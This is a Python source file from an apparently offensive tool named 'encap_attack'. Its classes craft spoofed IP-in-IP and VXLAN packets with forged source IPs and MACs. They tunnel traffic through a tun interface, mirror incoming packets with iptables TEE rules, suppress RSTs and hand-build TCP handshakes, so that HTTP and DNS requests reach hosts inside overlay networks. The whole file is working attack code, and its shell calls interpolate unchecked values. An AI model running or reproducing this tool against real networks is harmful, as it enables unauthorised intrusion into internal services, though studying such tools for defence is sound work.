from abc import ABC, abstractmethod
from scapy.all import *
from random import randint
from getmac import get_mac_address as get_mac
from encap_attack.utils.util_models import *
from encap_attack.utils.utils import *
from time import sleep
import click
from typing import Optional, Union

class EncapsulationModel(ABC):

    @abstractmethod
    def __init__(self, intermediary_dst_ip: str, spoofed_src_ip: Optional[str], spoofed_src_mac: Optional[str] = None, iface: Optional[str] = None, iface_ip: Optional[str] = None, verbose: bool = False) -> None:
        """Initialise an encapsulation model."""

        if (iface):
            self._iface = iface
            self._iface_calculated = False
        else:
            self._iface = str(conf.iface)
            self._iface_calculated = True
        if (iface_ip):
            self._iface_ip = iface_ip
        else:
            self._iface_ip = getIfaceIp(self._iface)
        click.echo("Interface IP: " + click.style(self._iface_ip, fg="cyan", bold=True))
        self._iface_mac = get_mac(self._iface_ip)
        self._spoofed_src_ip = spoofed_src_ip
        if (spoofed_src_mac):
            self._spoofed_src_mac = spoofed_src_mac
        else:
            self._spoofed_src_mac = get_mac(ip=self._spoofed_src_ip)
        self._spoofed_src_mac = get_mac(ip=self._spoofed_src_ip)
        self._intermediary_dst_ip = intermediary_dst_ip
        self._intermediary_dst_mac = get_mac(ip=self._intermediary_dst_ip)
        self._verbose = verbose

    @abstractmethod
    def _getPacketHeader(self) -> Packet:
        """Get the header frames for a packet."""

        pass

    def _sendPacket(self, packet, name: str = "", wait: bool = True, newline: bool = True) -> None:
        """Send an Ether packet."""

        if wait: sleep(0.1) # this ensures sniffers have started properly before we expect a response
        if (name == ""): name = "packet"
        if newline: click.echo()
        if (self._verbose):
            click.secho(f"Sending {name}:", fg="magenta", bold=True)
            click.echo(packet.show2(dump=True))
        else:
            click.echo(click.style(f"Sending {name}: ", fg="magenta", bold=True) + str(packet))
        if self._iface_calculated:
            sendp(packet, loop=0, verbose=self._verbose)
        else:
            sendp(packet, loop=0, verbose=self._verbose, iface=self._iface)
    
    def _verboseSnifferPacketHandler(self, packet: Packet) -> None:
        """Log a sniffed packet if in verbose mode."""

        if (self._verbose):
            click.echo(f"\n\nSniffed packet:\n{packet.show2(dump=True)}")
    
    def _getAsyncSniffer(self, filter: str, count: int) -> AsyncSniffer:
        """Get a Scapy AsyncSniffer, forcing the interface to use if required."""

        if self._iface_calculated:
            s = AsyncSniffer(filter=filter, count=count, timeout=20, prn=self._verboseSnifferPacketHandler)
            return s
        else:
            return AsyncSniffer(filter=filter, count=count, timeout=20, prn=self._verboseSnifferPacketHandler, iface=self._iface)

    def __processTunnelPacket(self, packet: Packet) -> None:
        """Encapsulate a packet and send it on."""

        if (IP not in packet or packet[IP].dst != self._iface_ip):
            if (self._verbose): click.echo("\n")
            click.echo(f"\nEncapsulating packet: {packet}")
            encapsulatedPacket = self._getPacketHeader() / packet
            self._sendPacket(encapsulatedPacket, "encapsulated packet", wait=False, newline=False)
        elif (self._verbose):
            click.echo(f"Ignoring packet: {packet.summary()}")

    def runTunnel(self, tunnel_meta: TunnelMeta) -> None:
        """Start a tun interface to encapsulate specific traffic before sending."""

        tun_number = 0
        while (os.path.exists(f"/sys/net/tun{tun_number}")):
            tun_number += 1
        tun_iface = f"tun{tun_number}"
        t = TunTapInterface(tun_iface)
        os.system(f"ip link set {tun_iface} up")
        os.system(f"ip a add {self._iface_ip} dev {tun_iface}")
        if (self._verbose): click.echo(f"Created tunnel interface {tun_iface}")
        for route in tunnel_meta.getRoutes:
            os.system(f"ip ro add {route} dev {tun_iface}")
            if (self._verbose): click.echo(f"Added route for {route} via tunnel interface {tun_iface}")
        direct_routing_gateway_ip = tunnel_meta.getDirectRoutingGatewayIP
        if (direct_routing_gateway_ip):
            os.system(f"ip a add {direct_routing_gateway_ip} dev {tun_iface}")
            os.system(f"iptables -t mangle -A PREROUTING -i {self._iface} -j TEE --gateway {direct_routing_gateway_ip}")
            if (self._verbose): click.echo(f"Added gateway IP {direct_routing_gateway_ip} to tunnel interface {tun_iface} and started duplicating all incoming packets on {self._iface} to this interface")
        click.secho(f"\nStarting tunnel {tun_iface}, press Ctrl+C to stop...\n", fg="magenta", bold=True)
        try:
            sniff(prn=self.__processTunnelPacket, iface=tun_iface, store=0)
        finally:
            click.secho("\n\nTunnel closed", fg="red")
            if (direct_routing_gateway_ip):
                os.system(f"iptables -t mangle -D PREROUTING -i {self._iface} -j TEE --gateway {direct_routing_gateway_ip}")
                if (self._verbose): click.echo(f"Stopped duplicating incoming packets to tunnel interface")
            if (self._verbose): click.echo(f"Deleted tunnel interface {tun_iface}")
    
    def __submitHTTP(self, request_payload: str, dst_ip: str, dst_port: int, src_port: int) -> list:
        """Send an encapsulated HTTP request and return the response."""

        request_payload = request_payload.replace("\\n", "\n").replace("\\r", "\r")
        os.system(f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {self._iface_ip} -j DROP")

        full_header = self._getPacketHeader() / IP(src = self._iface_ip, dst=dst_ip)

        syn_packet = full_header / TCP(sport=src_port, dport=dst_port, flags="S")
        syn_sniff = self._getAsyncSniffer(filter=f"tcp and port {src_port}", count=1)
        syn_sniff.start()
        self._sendPacket(syn_packet, "SYN")
        syn_sniff.join()
        if (not hasattr(syn_sniff, "results") or len(syn_sniff.results) < 1):
            click.secho("\nRequest timed out.", fg="red", bold=True)
            return []
        synack = syn_sniff.results[0]

        ack_sniff = self._getAsyncSniffer(filter=f"tcp and port {syn_packet[TCP].sport}", count=3)
        ack_sniff.start()
        ack_packet = full_header / TCP(sport=src_port, dport=dst_port, flags="A", seq=synack[TCP].ack, ack=synack[TCP].seq+1)
        self._sendPacket(ack_packet, "ACK")

        ack_push = full_header / TCP(sport=src_port, dport=dst_port, flags="AP", seq=synack[TCP].ack, ack=synack[TCP].seq+1) / Raw(load=request_payload)
        self._sendPacket(ack_push, "ACK PUSH")
        
        ack_sniff.join()

        if (not hasattr(ack_sniff, "results") or len(ack_sniff.results) < 3):
            click.secho("\nRequest timed out.", fg="red", bold=True)
            return []

        if ("F" in ack_sniff.results[2][TCP].flags):
            click.echo("Server closing connection")
            ack = full_header / TCP(sport=src_port, dport=dst_port, flags="A", seq=ack_sniff.results[2][TCP].ack, ack=ack_sniff.results[2][TCP].seq)
            self._sendPacket(ack, "ACK")
            fin_ack = full_header / TCP(sport=src_port, dport=dst_port, flags="FA", seq=ack_sniff.results[2][TCP].ack, ack=ack_sniff.results[2][TCP].seq+1)
            self._sendPacket(fin_ack, "FIN ACK")
        else:
            ack = full_header / TCP(sport=src_port, dport=dst_port, flags="A", seq=ack_sniff.results[1][TCP].ack, ack=ack_sniff.results[1][TCP].seq+1)
            self._sendPacket(ack, "ACK")
            fin_ack_sniff = self._getAsyncSniffer(filter=f"tcp and port {syn_packet[TCP].sport}", count=1)

            fin_ack_sniff.start()
            fin_ack = full_header / TCP(sport=src_port, dport=dst_port, flags="FA", seq=ack_sniff.results[2][TCP].ack, ack=ack_sniff.results[2][TCP].seq+1)
            self._sendPacket(fin_ack, "FIN ACK")
            fin_ack_sniff.join()

            final_ack = full_header / TCP(sport=src_port, dport=dst_port, flags="A", seq=fin_ack_sniff.results[0][TCP].ack, ack=fin_ack_sniff.results[0][TCP].seq+1)
            self._sendPacket(final_ack, "ACK")
        
        os.system(f"iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {self._iface_ip} -j DROP")
        return ack_sniff.results

    def sendHTTP(self, request_payload: str, dst_ip: str, dst_port: int = 80, src_port: Optional[int] = None) -> None:
        """Submit an encapsulated HTTP request and print the response."""

        if (not src_port): src_port = randint(1000,65000)
        if (self._verbose): click.echo(f"TCP source port: {src_port}")

        response = self.__submitHTTP(request_payload + "\r\n\r\n", dst_ip, dst_port, src_port)
        click.echo("\nResponse:")
        if (len(response) > 1):
            click.echo()
            for r in response:
                if hasattr(r[TCP], "load"): click.echo(r[TCP].load)
        else:
            click.secho("  No response returned.", fg="red", bold=True)
    
    def __submitDNS(self, dst_ip: str, qname: str, qtype: str, dst_port: int, src_port: int) -> dict[str, Union[str, int]]:
        """Send an encapsulated DNS request and return the response."""
        
        packet = self._getPacketHeader() / IP(src = self._iface_ip, dst=dst_ip) / UDP(sport=src_port, dport=dst_port) / DNS(rd=1, qd=DNSQR(qname=qname,qtype=qtype))
        
        sniff = self._getAsyncSniffer(filter=f"udp and port {src_port}", count=1)
        sniff.start()
        self._sendPacket(packet, "DNS packet")
        sniff.join()

        if (len(sniff.results) == 0):
            click.secho("\nRequest timed out.", fg="red", bold=True)
            return {}

        try:
            response = sniff.results[0][UDP]
        except:
            click.secho("Unable to process response.", fg="red", bold=True)
            return {}
        results = {}
        
        for i in range(0, response.ancount):
            record = response.an[i]
            if (qtype == "SRV"):
                name = record.target.decode().rstrip('.')
                results[name] = record.port
            else:
                name = record.rrname.decode().rstrip(".")
                results[name] = record.rdata
        
        return results

    def sendDNS(self, dst_ip: str, qname: str, qtype: str, dst_port: int = 53, src_port: Optional[int] = None) -> dict[str, Union[str, int]]:
        """Send an encapsulated DNS request and print the response."""

        if (not src_port): src_port = randint(1000,65000)

        results = self.__submitDNS(dst_ip, qname, qtype, dst_port, src_port)

        click.echo("\nResponse:")
        for name, port in results.items():
            click.secho(f"  {name}: {port}", fg="green", bold=True)
        if len(results.items()) == 0:
            click.secho("  No records returned.", fg="red", bold=True)
        return results

class IPIPEncapsulationModel(EncapsulationModel):

    def __init__(self, intermediary_dst_ip: str, spoofed_src_ip: Optional[str] = None, spoofed_src_mac: Optional[str] = None, iface: Optional[str] = None, iface_ip: Optional[str] = None, verbose: bool = False) -> None:
        """Initialise an IP-in-IP encapsulation model."""

        super().__init__(intermediary_dst_ip, spoofed_src_ip=spoofed_src_ip, spoofed_src_mac=spoofed_src_mac, iface=iface, iface_ip=iface_ip, verbose=verbose)
    
    def _getPacketHeader(self) -> Packet:
        """Get an IP-in-IP header."""

        ether = Ether(src=self._spoofed_src_mac,dst=self._intermediary_dst_mac)
        return ether / IP(src=self._spoofed_src_ip,dst=self._intermediary_dst_ip)

class VXLANEncapsulationModel(EncapsulationModel):

    def __init__(self, intermediary_dst_ip: str, inner_dst_mac: str, vni: int = 4096, vxlan_src_port: Optional[int] = None, vxlan_dst_port: int = 4789, spoofed_src_ip: Optional[str] = None, spoofed_src_mac: Optional[str] = None, iface: Optional[str] = None, iface_ip: Optional[str] = None, verbose: bool = False) -> None:
        """Initialise a VXLAN encapsulation model."""
        
        if (not vxlan_src_port): vxlan_src_port = randint(1000,65000)
        
        super().__init__(intermediary_dst_ip, spoofed_src_ip=spoofed_src_ip, spoofed_src_mac=spoofed_src_mac, iface=iface, iface_ip=iface_ip, verbose=verbose)
        self._inner_dst_mac = inner_dst_mac # VTEP of target node
        self._vni = vni
        self._vxlan_src_port = vxlan_src_port
        self._vxlan_dst_port = vxlan_dst_port
    
    def _getPacketHeader(self) -> Packet:
        """Get a VXLAN header."""

        outer_ether = Ether(src=self._spoofed_src_mac,dst=self._intermediary_dst_mac)
        inner_ether = Ether(src=self._iface_mac,dst=self._inner_dst_mac)
        return outer_ether / IP(src=self._spoofed_src_ip,dst=self._intermediary_dst_ip) / UDP(sport=self._vxlan_src_port,dport=self._vxlan_dst_port) / VXLAN(vni=self._vni, flags="Instance") / inner_ether
